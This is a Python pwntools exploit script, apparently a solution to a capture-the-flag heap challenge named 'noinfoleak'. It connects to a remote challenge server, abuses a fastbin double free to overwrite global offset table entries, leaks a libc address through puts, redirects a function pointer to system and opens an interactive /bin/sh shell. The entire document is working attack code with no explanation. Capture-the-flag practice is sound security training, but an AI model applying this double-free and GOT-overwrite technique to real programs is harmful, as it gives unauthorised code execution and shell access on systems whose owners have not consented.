from pwn import *
def cmd(c):
	p.sendlineafter(">",str(c))
def add(size,c):
	cmd(1)
	cmd(size)
	p.sendlineafter(">",c)
def free(idx):
	cmd(2)
	cmd(idx)
def edit(idx,c):
	cmd(3)
	cmd(idx)
	p.sendafter(">",c)
#p=process("./noinfoleak")
p=remote("ctf2.linkedbyx.com",10856)
got=0x000000000601018
puts=0x4006b0
context.log_level='debug'
add(0x67,"A")#0
add(0x67,"A")#1
free(0)
free(1)
free(0)
add(0x67,p64(0x60108d))
add(0x67,"A")
add(0x67,"A")
add(0x67,"\x00"*3+p64(got)+p64(0x20)+p64(0x000000000601020)+p64(0x20)+p64(0x000000000601068)+'\xaa')
edit(0,p64(0x4006b0)[:-1])
free(1)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7a7e290-0x7ffff7a0d000)
libc=ELF("./noinfoleak").libc
libc.address=base
log.info(hex(base))
edit(2,p64(libc.symbols['system']))
cmd("/bin/sh")
#gdb.attach(p)


p.interactive()

